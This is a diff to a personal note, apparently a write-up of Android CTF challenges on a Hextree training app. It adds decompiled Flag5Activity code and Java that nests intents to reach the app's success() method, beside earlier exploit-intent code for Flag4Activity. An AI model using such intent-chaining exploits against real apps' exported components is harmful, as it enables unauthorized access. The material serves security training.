@@ -1,7 +1,7 @@
 
 2025-06-09 10:57
 
-Source: #android 
+Source: #android #CTF 
 # Activity  
 
 Take the apk in jadx and check the android manifest to find activities related to flag
@@ -20,6 +20,13 @@ public void onClick(View view) {
 }
 ```
 #### 2 - intent w extras
+
+
+```xml
+<intent-filter>
+    <action android:name="io.hextree.action.GIVE_FLAG"/>
+</intent-filter>
+```
 
 #### 3 - Intent w data URI
 
@@ -64,6 +71,44 @@ Intent exploitIntent = new Intent();
 exploitIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
 exploitIntent.setAction("PREPARE_ACTION");  
 startActivity(exploitIntent);
+```
+#### 5 - Intent in intent
+
+jump through multiple intent to reach `success()`, below is the code snippet from `flag5activity` from `jadx`.
+```java
+public void onCreate(Bundle bundle) {
+	    ...
+        Intent intent = getIntent();
+        Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
+        if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
+            return;
+        }
+        this.f.addTag(42);
+        Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
+        this.nextIntent = intent3;
+        if (intent3 == null || intent3.getStringExtra("reason") == null) {
+            return;
+        }
+        ... // similar patterned code ahead 
+```
+
+We will use `putExtra()` here to call intent in an intent
+```java
+public void onClick(View view) {  
+    Intent nextIntent = new Intent();  
+    nextIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
+    nextIntent.putExtra("reason", "back");  
+ 
+    Intent middleIntent = new Intent();  
+    middleIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
+    middleIntent.putExtra("return", 42);           
+    middleIntent.putExtra("nextIntent", nextIntent);  
+  
+    Intent outerIntent = new Intent();  
+    outerIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
+    outerIntent.putExtra("android.intent.extra.INTENT", middleIntent);  
+    startActivity(outerIntent);  
+}
 ```
 
 ### References
